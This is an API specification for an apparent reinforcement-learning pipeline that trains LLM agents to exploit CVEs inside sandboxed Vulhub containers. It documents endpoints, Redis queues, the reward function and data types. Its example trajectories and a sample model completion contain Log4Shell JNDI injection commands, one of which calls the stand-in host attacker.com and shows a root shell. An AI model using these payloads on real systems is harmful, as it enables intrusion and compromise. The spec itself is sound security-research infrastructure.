# API Input/Output Specification

This document defines all data models, API endpoints, and communication contracts between components in the VulRL Worker Orchestration system.

---

## Component Overview

```
┌─────────────────┐
│  SkyRL Trainer  │ ──→ HTTP REST ──→ ┌──────────────┐
│  (Generator)    │                   │ Worker Router│
└─────────────────┘                   └──────┬───────┘
                                             │
                                      Redis Queue
                                             │
┌─────────────────┐                   ┌──────▼───────┐
│   LLM Server    │ ←── HTTP REST ──← │ Worker Unit  │
│ (Inference Eng) │                   └──────────────┘
└─────────────────┘
```

---

## 1. SkyRL Trainer ↔ Worker Router

### 1.1 POST `/api/rollout/execute` - Execute Rollout

**Description**: Submit a new rollout task for execution.

**Request Model**:
```python
from pydantic import BaseModel
from typing import Optional

class RolloutRequest(BaseModel):
    """Request to execute a single rollout"""
    
    # CVE Information
    cve_id: str                    # e.g., "CVE-2021-44228"
    vulhub_path: str               # e.g., "/data/vulhub/log4shell"
    
    # Task Configuration
    prompt: str                    # Initial user prompt for LLM
    max_steps: int = 20           # Maximum exploitation steps
    timeout: int = 1800           # Timeout in seconds (30 minutes)
    
    # LLM Configuration
    llm_endpoint: str              # e.g., "http://127.0.0.1:8001"
    model_name: str                # e.g., "Qwen/Qwen2.5-7B-Instruct"
    temperature: float = 0.7       # Sampling temperature
    max_tokens: int = 512          # Max tokens per LLM response
    
    # Optional Metadata
    metadata: Optional[dict] = {}  # Additional task metadata
```

**Example Request**:
```json
{
  "cve_id": "CVE-2021-44228",
  "vulhub_path": "/data/vulhub/log4j/CVE-2021-44228",
  "prompt": "You are tasked with exploiting Log4Shell (CVE-2021-44228) on the target system at 172.17.0.2. Use JNDI injection to gain remote code execution.",
  "max_steps": 20,
  "timeout": 1800,
  "llm_endpoint": "http://127.0.0.1:8001",
  "model_name": "Qwen/Qwen2.5-7B-Instruct",
  "temperature": 0.7,
  "max_tokens": 512,
  "metadata": {
    "dataset": "vulhub",
    "difficulty": "medium"
  }
}
```

**Response Model**:
```python
class RolloutResponse(BaseModel):
    """Immediate response after task submission"""
    
    task_id: str                   # Unique task identifier (UUID)
    status: str                    # "queued" | "running"
    worker_id: Optional[str]       # Assigned worker ID (if running)
    queued_at: float               # Timestamp when queued
    estimated_duration: Optional[int] = None  # Estimated duration in seconds
```

**Example Response**:
```json
{
  "task_id": "550e8400-e29b-41d4-a716-446655440000",
  "status": "running",
  "worker_id": "worker-abc123",
  "queued_at": 1709978400.0,
  "estimated_duration": 1200
}
```

**Status Codes**:
- `200 OK`: Task successfully queued/started
- `503 Service Unavailable`: No workers available, task queued
- `400 Bad Request`: Invalid request parameters
- `500 Internal Server Error`: Server error

---

### 1.2 GET `/api/rollout/status/{task_id}` - Get Task Status

**Description**: Retrieve the status and results of a rollout task.

**Path Parameters**:
- `task_id` (string, required): The task UUID

**Response Model**:
```python
class RolloutResult(BaseModel):
    """Complete rollout result"""
    
    # Task Info
    task_id: str
    status: str                    # "queued" | "running" | "completed" | "failed" | "timeout"
    worker_id: Optional[str]
    
    # Timestamps
    queued_at: float
    started_at: Optional[float]
    completed_at: Optional[float]
    duration: Optional[float]      # In seconds
    
    # Results (only if status == "completed")
    reward: Optional[float]        # Final reward (0.0 to 1.0)
    trajectory: Optional[list]     # List of steps (see TrajectoryStep)
    success: Optional[bool]        # Whether exploitation succeeded
    
    # Metadata
    metadata: dict                 # Task metadata + execution metadata
    
    # Error Info (only if status == "failed")
    error: Optional[str]           # Error message
    error_type: Optional[str]      # Error type/category
```

**Trajectory Step Model**:
```python
class TrajectoryStep(BaseModel):
    """Single step in exploitation trajectory"""
    
    step: int                      # Step number (0-indexed)
    action: str                    # LLM-generated action
    observation: str               # Environment observation
    reward: float                  # Step reward
    done: bool                     # Whether episode ended
    metadata: dict                 # Step metadata (exit_code, timing, etc.)
```

**Example Response (Completed)**:
```json
{
  "task_id": "550e8400-e29b-41d4-a716-446655440000",
  "status": "completed",
  "worker_id": "worker-abc123",
  "queued_at": 1709978400.0,
  "started_at": 1709978405.0,
  "completed_at": 1709979605.0,
  "duration": 1200.0,
  "reward": 0.85,
  "success": true,
  "trajectory": [
    {
      "step": 0,
      "action": "nmap -p 8080 172.17.0.2",
      "observation": "PORT     STATE SERVICE\n8080/tcp open  http-proxy",
      "reward": 0.1,
      "done": false,
      "metadata": {"exit_code": 0, "duration": 2.3}
    },
    {
      "step": 1,
      "action": "curl -H 'X-Api-Version: ${jndi:ldap://attacker.com/a}' http://172.17.0.2:8080",
      "observation": "LDAP connection received, shell obtained\nroot@target:/#",
      "reward": 1.0,
      "done": true,
      "metadata": {"exit_code": 0, "duration": 5.1}
    }
  ],
  "metadata": {
    "cve_id": "CVE-2021-44228",
    "dataset": "vulhub",
    "total_llm_calls": 2,
    "total_tokens_used": 856,
    "docker_containers_spawned": 3
  }
}
```

**Example Response (Failed)**:
```json
{
  "task_id": "550e8400-e29b-41d4-a716-446655440000",
  "status": "failed",
  "worker_id": "worker-abc123",
  "queued_at": 1709978400.0,
  "started_at": 1709978405.0,
  "completed_at": 1709978425.0,
  "duration": 20.0,
  "reward": null,
  "success": false,
  "trajectory": null,
  "metadata": {},
  "error": "Docker compose failed to start containers",
  "error_type": "DockerError"
}
```

**Status Codes**:
- `200 OK`: Status retrieved successfully
- `404 Not Found`: Task ID not found
- `500 Internal Server Error`: Server error

---

### 1.3 GET `/api/workers/status` - Get Workers Status

**Description**: Get status of all worker units.

**Response Model**:
```python
class WorkerStatus(BaseModel):
    """Status of a single worker"""
    
    worker_id: str
    status: str                    # "idle" | "busy" | "dead"
    pid: int                       # Process ID
    started_at: float              # Timestamp when started
    current_task: Optional[str]    # Current task_id (if busy)
    tasks_completed: int           # Total tasks completed
    tasks_failed: int              # Total tasks failed
    average_duration: Optional[float]  # Average task duration
    
class WorkersStatusResponse(BaseModel):
    """Status of all workers"""
    
    workers: list[WorkerStatus]
    total: int
    active: int                    # busy + idle
    idle: int
    busy: int
    dead: int
    queue_length: int              # Total queued tasks
```

**Example Response**:
```json
{
  "workers": [
    {
      "worker_id": "worker-abc123",
      "status": "busy",
      "pid": 12345,
      "started_at": 1709978000.0,
      "current_task": "550e8400-e29b-41d4-a716-446655440000",
      "tasks_completed": 15,
      "tasks_failed": 1,
      "average_duration": 1250.5
    },
    {
      "worker_id": "worker-def456",
      "status": "idle",
      "pid": 12346,
      "started_at": 1709978000.0,
      "current_task": null,
      "tasks_completed": 12,
      "tasks_failed": 0,
      "average_duration": 1180.2
    }
  ],
  "total": 10,
  "active": 10,
  "idle": 8,
  "busy": 2,
  "dead": 0,
  "queue_length": 3
}
```

---

### 1.4 POST `/api/workers/{worker_id}/shutdown` - Shutdown Worker

**Description**: Gracefully shutdown a specific worker.

**Path Parameters**:
- `worker_id` (string, required): The worker UUID

**Response Model**:
```python
class ShutdownResponse(BaseModel):
    """Response for worker shutdown"""
    
    status: str                    # "shutdown_initiated" | "not_found"
    worker_id: str
    message: str
```

**Example Response**:
```json
{
  "status": "shutdown_initiated",
  "worker_id": "worker-abc123",
  "message": "Worker will complete current task and shutdown"
}
```

---

## 2. Worker Unit ↔ LLM Server (SkyRL Inference Engine)

### 2.1 POST `/v1/chat/completions` - Generate Response

**Description**: Generate LLM response for chat-based interaction.

**Request Model**:
```python
class Message(BaseModel):
    """Single message in conversation"""
    
    role: str                      # "system" | "user" | "assistant"
    content: str                   # Message content

class ChatCompletionRequest(BaseModel):
    """OpenAI-compatible chat completion request"""
    
    model: str                     # Model name (must match SkyRL config)
    messages: list[Message]        # Conversation history
    max_tokens: int = 512          # Max tokens to generate
    temperature: float = 0.7       # Sampling temperature (0.0-2.0)
    top_p: float = 1.0            # Nucleus sampling
    top_k: int = -1               # Top-k sampling (-1 = disabled)
    repetition_penalty: float = 1.0
    stop: Optional[list[str]] = None  # Stop sequences
    stream: bool = False           # Streaming (not used in workers)
```

**Example Request**:
```json
{
  "model": "Qwen/Qwen2.5-7B-Instruct",
  "messages": [
    {
      "role": "system",
      "content": "You are a penetration testing agent. Provide concrete bash commands for exploitation."
    },
    {
      "role": "user",
      "content": "Exploit CVE-2021-44228 on target 172.17.0.2:8080"
    }
  ],
  "max_tokens": 512,
  "temperature": 0.7,
  "top_p": 1.0,
  "stop": ["```", "# End"]
}
```

**Response Model**:
```python
class Choice(BaseModel):
    """Single completion choice"""
    
    index: int
    message: Message               # Generated message
    finish_reason: str             # "stop" | "length" | "abort"
    logprobs: Optional[dict]       # Token logprobs (if requested)

class Usage(BaseModel):
    """Token usage statistics"""
    
    prompt_tokens: int
    completion_tokens: int
    total_tokens: int

class ChatCompletionResponse(BaseModel):
    """OpenAI-compatible chat completion response"""
    
    id: str                        # Response ID
    object: str                    # "chat.completion"
    created: int                   # Unix timestamp
    model: str                     # Model name
    choices: list[Choice]          # Completion choices
    usage: Usage                   # Token usage
```

**Example Response**:
```json
{
  "id": "chatcmpl-abc123",
  "object": "chat.completion",
  "created": 1709978400,
  "model": "Qwen/Qwen2.5-7B-Instruct",
  "choices": [
    {
      "index": 0,
      "message": {
        "role": "assistant",
        "content": "# Step 1: Verify the target is running Log4j\ncurl -i http://172.17.0.2:8080\n\n# Step 2: Setup LDAP server on attacker machine\npython3 -m http.server 8888 &\n\n# Step 3: Inject JNDI payload\ncurl -H 'X-Api-Version: ${jndi:ldap://172.17.0.1:1389/Exploit}' http://172.17.0.2:8080/api"
      },
      "finish_reason": "stop",
      "logprobs": null
    }
  ],
  "usage": {
    "prompt_tokens": 145,
    "completion_tokens": 98,
    "total_tokens": 243
  }
}
```

**Error Response**:
```json
{
  "error": {
    "message": "Invalid model name",
    "type": "invalid_request_error",
    "code": "model_not_found"
  }
}
```

---

### 2.2 POST `/v1/completions` - Text Completion

**Description**: Generate completion for raw text prompt (alternative to chat).

**Request Model**:
```python
class CompletionRequest(BaseModel):
    """OpenAI-compatible completion request"""
    
    model: str
    prompt: str                    # Raw text prompt
    max_tokens: int = 512
    temperature: float = 0.7
    top_p: float = 1.0
    stop: Optional[list[str]] = None
```

**Response Model**: Similar to ChatCompletionResponse but with `text` instead of `message`.

---

## 3. Worker Router ↔ Worker Unit (via Redis)

### 3.1 Redis Queue Structure

**Queue Keys**:
```python
# Task queue for each worker
f"worker:{worker_id}:queue"  # List (LPUSH/BRPOP)
```

**Task Assignment**:
```python
# Router pushes task_id to worker queue
redis.lpush(f"worker:{worker_id}:queue", task_id)

# Worker blocks and pops from queue
task_id = redis.brpop(f"worker:{worker_id}:queue", timeout=5)
```

---

### 3.2 Redis State Structure

**Worker State**:
```python
# Worker metadata (hash)
f"worker:{worker_id}" = {
    "status": "idle" | "busy" | "dead",
    "pid": 12345,
    "started_at": 1709978400.0,
    "current_task": task_id or None,
    "tasks_completed": 15,
    "tasks_failed": 1,
}
```

**Task Metadata**:
```python
# Task metadata (hash)
f"task:{task_id}" = {
    "status": "queued" | "running" | "completed" | "failed" | "timeout",
    "worker_id": "worker-abc123",
    "request": json.dumps(RolloutRequest),  # Serialized request
    "queued_at": 1709978400.0,
    "started_at": 1709978405.0,
    "completed_at": 1709979605.0,
    "error": "error message" (if failed),
}
```

**Task Result**:
```python
# Task result (string with TTL)
f"result:{task_id}" = json.dumps({
    "reward": 0.85,
    "trajectory": [...],
    "metadata": {...},
})
# TTL: 3600 seconds (1 hour)
```

---

### 3.3 Worker Execution Flow

**Step 1: Worker polls queue**
```python
task_id = await redis.brpop(f"worker:{worker_id}:queue", timeout=5)
```

**Step 2: Update worker status**
```python
await redis.hset(f"worker:{worker_id}", "status", "busy")
await redis.hset(f"worker:{worker_id}", "current_task", task_id)
```

**Step 3: Get task details**
```python
task_data = await redis.hgetall(f"task:{task_id}")
request = json.loads(task_data["request"])
```

**Step 4: Update task status**
```python
await redis.hset(f"task:{task_id}", "status", "running")
await redis.hset(f"task:{task_id}", "started_at", time.time())
```

**Step 5: Execute rollout** (see Worker Internal API)

**Step 6: Store result**
```python
result = {
    "reward": 0.85,
    "trajectory": [...],
    "metadata": {...},
}
await redis.set(f"result:{task_id}", json.dumps(result), ex=3600)
```

**Step 7: Update task status**
```python
await redis.hset(f"task:{task_id}", "status", "completed")
await redis.hset(f"task:{task_id}", "completed_at", time.time())
```

**Step 8: Update worker status**
```python
await redis.hset(f"worker:{worker_id}", "status", "idle")
await redis.hset(f"worker:{worker_id}", "current_task", None)
await redis.hincrby(f"worker:{worker_id}", "tasks_completed", 1)
```

---

## 4. Worker Unit Internal API

### 4.1 Docker Environment Setup

**Input**:
```python
class DockerSetupInput:
    vulhub_path: str               # Path to docker-compose directory
    worker_id: str                 # For container labeling
```

**Output**:
```python
class DockerContext:
    network_id: str                # Docker network ID
    containers: list[str]          # List of container IDs
    target_ip: str                 # Target container IP
    target_port: int               # Target port
    compose_project: str           # docker-compose project name
```

**Example**:
```python
docker_context = await worker._setup_docker_env(
    vulhub_path="/data/vulhub/log4j/CVE-2021-44228"
)
# Returns:
# {
#   "network_id": "vulrl_cve202144228_net",
#   "containers": ["container_id_1", "container_id_2"],
#   "target_ip": "172.17.0.2",
#   "target_port": 8080,
#   "compose_project": "CVE-2021-44228"
# }
```

---

### 4.2 Action Execution

**Input**:
```python
class ActionExecutionInput:
    action: str                    # LLM-generated command
    docker_context: DockerContext
    timeout: int = 60              # Execution timeout
```

**Output**:
```python
class ActionExecutionOutput:
    observation: str               # Command output
    reward: float                  # Computed reward
    done: bool                     # Whether episode ended
    metadata: dict                 # Exit code, timing, etc.
```

**Example**:
```python
output = await worker._execute_action(
    action="nmap -p 8080 172.17.0.2",
    docker_context=docker_context,
    timeout=60
)
# Returns:
# {
#   "observation": "PORT     STATE SERVICE\n8080/tcp open  http-proxy",
#   "reward": 0.1,
#   "done": False,
#   "metadata": {"exit_code": 0, "duration": 2.3}
# }
```

---

### 4.3 Reward Computation

**Input**:
```python
class RewardComputationInput:
    observation: str               # Action output
    action: str                    # Action taken
    cve_id: str                   # CVE identifier
    step: int                     # Current step number
```

**Output**:
```python
class RewardOutput:
    reward: float                  # Scalar reward (0.0 to 1.0)
    done: bool                     # Episode termination
    success_indicators: list[str]  # Matched success patterns
```

**Reward Function**:
```python
def compute_reward(observation: str, action: str, cve_id: str) -> tuple[float, bool]:
    """
    Reward structure:
    - 1.0: Successful exploitation (shell obtained, flag captured)
    - 0.5: Significant progress (connection established, vulnerability confirmed)
    - 0.1: Minor progress (service detected, port open)
    - 0.0: No progress
    - -0.1: Error or failed action
    """
    
    # Success indicators (1.0 reward, done=True)
    success_patterns = [
        "shell obtained",
        "root@",
        "# whoami",
        "flag{",
        "privilege escalation successful",
    ]
    
    # Progress indicators (0.1-0.5 reward, done=False)
    progress_patterns = {
        0.5: ["connection established", "vulnerability confirmed", "exploit succeeded"],
        0.3: ["service detected", "authentication bypassed"],
        0.1: ["port open", "service running"],
    }
    
    # Error indicators (-0.1 reward, done=False)
    error_patterns = [
        "error",
        "failed",
        "connection refused",
        "timeout",
    ]
```

---

## 5. SkyRL Generator Integration

### 5.1 Custom Generator Implementation

**Generator Interface**:
```python
from skyrl_train.generators.base import GeneratorInterface, GeneratorInput, GeneratorOutput

class VulRLGenerator(GeneratorInterface):
    """Custom generator that calls Worker Router for rollouts"""
    
    def __init__(
        self,
        generator_cfg,
        inference_engine_client,
        tokenizer,
        model_name: str,
        worker_router_url: str = "http://localhost:5000"
    ):
        self.inference_engine_client = inference_engine_client
        self.tokenizer = tokenizer
        self.model_name = model_name
        self.worker_router_url = worker_router_url
        
        # Get LLM endpoint from inference_engine_client
        if inference_engine_client.enable_http_endpoint:
            self.llm_endpoint = (
                f"http://{inference_engine_client.http_endpoint_host}:"
                f"{inference_engine_client.http_endpoint_port}"
            )
        else:
            raise ValueError("HTTP endpoint must be enabled!")
    
    async def generate(self, input_batch: GeneratorInput) -> GeneratorOutput:
        """
        Generate rollouts by calling Worker Router API
        
        Args:
            input_batch: {
                "prompts": List[List[Message]],  # Chat histories
                "env_classes": List[str],        # ["vulrl", "vulrl", ...]
                "env_extras": List[dict],        # [{cve_id, vulhub_path}, ...]
            }
        
        Returns:
            GeneratorOutput: {
                "prompt_token_ids": List[List[int]],
                "response_ids": List[List[int]],
                "rewards": List[float],
                "loss_masks": List[List[int]],
                "stop_reasons": List[str],
                "rollout_metrics": dict,
            }
        """
        # Implementation in WORKER_MANAGEMENT_TECH_SPEC.md
```

---

### 5.2 Input Batch Format

**GeneratorInput** (from SkyRL):
```python
{
    "prompts": [
        [
            {"role": "system", "content": "You are a pentester..."},
            {"role": "user", "content": "Exploit CVE-2021-44228..."}
        ],
        [
            {"role": "system", "content": "You are a pentester..."},
            {"role": "user", "content": "Exploit CVE-2022-12345..."}
        ],
        # ... more prompts (batch_size)
    ],
    "env_classes": ["vulrl", "vulrl", ...],  # All "vulrl"
    "env_extras": [
        {
            "cve_id": "CVE-2021-44228",
            "vulhub_path": "/data/vulhub/log4j/CVE-2021-44228",
            "reward_spec": {...}
        },
        {
            "cve_id": "CVE-2022-12345",
            "vulhub_path": "/data/vulhub/...",
            "reward_spec": {...}
        },
        # ... more extras
    ],
    "trajectory_ids": [...]  # Optional
}
```

---

### 5.3 Output Format

**GeneratorOutput** (to SkyRL):
```python
{
    "prompt_token_ids": [
        [token_id_1, token_id_2, ...],  # Tokenized prompt
        [token_id_1, token_id_2, ...],
        # ... batch_size items
    ],
    "response_ids": [
        [token_id_1, token_id_2, ...],  # Tokenized trajectory
        [token_id_1, token_id_2, ...],
        # ... batch_size items
    ],
    "rewards": [
        0.85,  # Final reward for trajectory 1
        0.0,   # Final reward for trajectory 2
        # ... batch_size items
    ],
    "loss_masks": [
        [1, 1, 1, 0, 0, ...],  # 1 = train on, 0 = ignore
        [1, 1, 1, 0, 0, ...],
        # ... batch_size items
    ],
    "stop_reasons": [
        "stop",    # Normal completion
        "length",  # Max length reached
        # ... batch_size items
    ],
    "rollout_metrics": {
        "average_reward": 0.425,
        "success_rate": 0.5,
        "average_steps": 8.5,
        # ... aggregated metrics
    }
}
```

---

## 6. Error Handling

### 6.1 Error Response Format

All API errors follow this format:

```python
class ErrorResponse(BaseModel):
    error: ErrorInfo

class ErrorInfo(BaseModel):
    message: str                   # Human-readable error message
    type: str                      # Error type/category
    code: str                      # Error code
    details: Optional[dict] = {}   # Additional error details
```

**Example**:
```json
{
  "error": {
    "message": "Worker timeout: task took longer than 1800 seconds",
    "type": "timeout_error",
    "code": "worker_timeout",
    "details": {
      "task_id": "550e8400-e29b-41d4-a716-446655440000",
      "worker_id": "worker-abc123",
      "duration": 1850.5
    }
  }
}
```

---

### 6.2 Error Types

| Error Type | Code | HTTP Status | Description |
|------------|------|-------------|-------------|
| `invalid_request_error` | `invalid_parameter` | 400 | Invalid request parameter |
| `invalid_request_error` | `missing_parameter` | 400 | Required parameter missing |
| `authentication_error` | `invalid_api_key` | 401 | Invalid API key (future) |
| `not_found_error` | `task_not_found` | 404 | Task ID not found |
| `not_found_error` | `worker_not_found` | 404 | Worker ID not found |
| `timeout_error` | `worker_timeout` | 504 | Worker timeout |
| `timeout_error` | `llm_timeout` | 504 | LLM timeout |
| `resource_error` | `no_workers_available` | 503 | All workers busy |
| `docker_error` | `docker_compose_failed` | 500 | Docker setup failed |
| `docker_error` | `container_crashed` | 500 | Container crashed |
| `llm_error` | `model_not_found` | 400 | LLM model not found |
| `llm_error` | `inference_failed` | 500 | LLM inference failed |
| `internal_error` | `redis_connection_failed` | 500 | Redis connection failed |
| `internal_error` | `worker_crashed` | 500 | Worker process crashed |

---

## 7. Complete Example Flow

### 7.1 Successful Rollout

```python
# 1. SkyRL Generator submits rollout
response = requests.post(
    "http://localhost:5000/api/rollout/execute",
    json={
        "cve_id": "CVE-2021-44228",
        "vulhub_path": "/data/vulhub/log4j/CVE-2021-44228",
        "prompt": "Exploit Log4Shell on 172.17.0.2:8080",
        "llm_endpoint": "http://127.0.0.1:8001",
        "model_name": "Qwen/Qwen2.5-7B-Instruct",
    }
)
task_id = response.json()["task_id"]  # "550e8400-..."

# 2. Worker Router assigns to worker
# Redis: LPUSH worker:abc123:queue "550e8400-..."

# 3. Worker polls and receives task
# Redis: BRPOP worker:abc123:queue → "550e8400-..."

# 4. Worker executes rollout
# 4.1 Setup Docker
docker_context = worker.setup_docker(...)

# 4.2 Query LLM (multiple times)
for step in range(max_steps):
    # Query LLM
    llm_response = requests.post(
        "http://127.0.0.1:8001/v1/chat/completions",
        json={
            "model": "Qwen/Qwen2.5-7B-Instruct",
            "messages": messages,
            "max_tokens": 512,
        }
    )
    action = llm_response.json()["choices"][0]["message"]["content"]
    
    # Execute action
    observation, reward, done = worker.execute_action(action, docker_context)
    
    # Update conversation
    messages.append({"role": "assistant", "content": action})
    messages.append({"role": "user", "content": observation})
    
    if done:
        break

# 4.3 Cleanup Docker
worker.cleanup_docker(docker_context)

# 5. Worker stores result
# Redis: SET result:550e8400-... '{"reward": 0.85, ...}' EX 3600

# 6. SkyRL Generator polls for result
while True:
    response = requests.get(
        f"http://localhost:5000/api/rollout/status/{task_id}"
    )
    if response.json()["status"] == "completed":
        result = response.json()
        break
    time.sleep(5)

# 7. SkyRL uses result for training
reward = result["reward"]  # 0.85
trajectory = result["trajectory"]  # [...]
```

---

## 8. Type Definitions (Python)

Complete type definitions for implementation:

```python
# worker_orchestrator/types.py

from pydantic import BaseModel, Field
from typing import Optional, List, Dict, Any, Literal
from datetime import datetime

# ============================================
# Worker Router API Models
# ============================================

class RolloutRequest(BaseModel):
    cve_id: str
    vulhub_path: str
    prompt: str
    max_steps: int = 20
    timeout: int = 1800
    llm_endpoint: str
    model_name: str
    temperature: float = 0.7
    max_tokens: int = 512
    metadata: Dict[str, Any] = {}

class RolloutResponse(BaseModel):
    task_id: str
    status: Literal["queued", "running"]
    worker_id: Optional[str] = None
    queued_at: float
    estimated_duration: Optional[int] = None

class TrajectoryStep(BaseModel):
    step: int
    action: str
    observation: str
    reward: float
    done: bool
    metadata: Dict[str, Any]

class RolloutResult(BaseModel):
    task_id: str
    status: Literal["queued", "running", "completed", "failed", "timeout"]
    worker_id: Optional[str] = None
    queued_at: float
    started_at: Optional[float] = None
    completed_at: Optional[float] = None
    duration: Optional[float] = None
    reward: Optional[float] = None
    trajectory: Optional[List[TrajectoryStep]] = None
    success: Optional[bool] = None
    metadata: Dict[str, Any] = {}
    error: Optional[str] = None
    error_type: Optional[str] = None

class WorkerStatus(BaseModel):
    worker_id: str
    status: Literal["idle", "busy", "dead"]
    pid: int
    started_at: float
    current_task: Optional[str] = None
    tasks_completed: int = 0
    tasks_failed: int = 0
    average_duration: Optional[float] = None

class WorkersStatusResponse(BaseModel):
    workers: List[WorkerStatus]
    total: int
    active: int
    idle: int
    busy: int
    dead: int
    queue_length: int

class ShutdownResponse(BaseModel):
    status: str
    worker_id: str
    message: str

# ============================================
# LLM API Models (OpenAI-compatible)
# ============================================

class Message(BaseModel):
    role: Literal["system", "user", "assistant"]
    content: str

class ChatCompletionRequest(BaseModel):
    model: str
    messages: List[Message]
    max_tokens: int = 512
    temperature: float = 0.7
    top_p: float = 1.0
    top_k: int = -1
    repetition_penalty: float = 1.0
    stop: Optional[List[str]] = None
    stream: bool = False

class Choice(BaseModel):
    index: int
    message: Message
    finish_reason: Literal["stop", "length", "abort"]
    logprobs: Optional[Dict[str, Any]] = None

class Usage(BaseModel):
    prompt_tokens: int
    completion_tokens: int
    total_tokens: int

class ChatCompletionResponse(BaseModel):
    id: str
    object: str = "chat.completion"
    created: int
    model: str
    choices: List[Choice]
    usage: Usage

# ============================================
# Error Models
# ============================================

class ErrorInfo(BaseModel):
    message: str
    type: str
    code: str
    details: Dict[str, Any] = {}

class ErrorResponse(BaseModel):
    error: ErrorInfo

# ============================================
# Worker Internal Models
# ============================================

class DockerContext(BaseModel):
    network_id: str
    containers: List[str]
    target_ip: str
    target_port: int
    compose_project: str

class ActionExecutionOutput(BaseModel):
    observation: str
    reward: float
    done: bool
    metadata: Dict[str, Any]
```

---

## 9. Configuration Files

### 9.1 Worker Router Config

```yaml
# worker_orchestrator/config.yaml

worker_router:
  host: "0.0.0.0"
  port: 5000
  max_workers: 10
  worker_timeout: 1800

redis:
  host: "localhost"
  port: 6379
  db: 0
  password: null

llm:
  default_endpoint: "http://127.0.0.1:8001"
  default_model: "Qwen/Qwen2.5-7B-Instruct"
  default_temperature: 0.7
  default_max_tokens: 512

docker:
  max_memory_per_container: "2g"
  max_cpus_per_container: 1.0
  network_mode: "bridge"

monitoring:
  enable_metrics: true
  metrics_port: 9090

logging:
  level: "INFO"
  format: "json"
```

---

## Summary

This API specification defines all communication contracts between:

1. **SkyRL Trainer ↔ Worker Router**: HTTP REST API
   - Submit rollouts, get status, monitor workers
2. **Worker Unit ↔ LLM Server**: OpenAI-compatible HTTP API
   - Chat completions for action generation
3. **Worker Router ↔ Worker Unit**: Redis queues + state
   - Task distribution, status tracking, result storage
4. **Worker Unit Internal**: Docker management, reward computation

All models use **Pydantic** for validation and **JSON** for serialization, ensuring type safety and easy debugging. 🎯
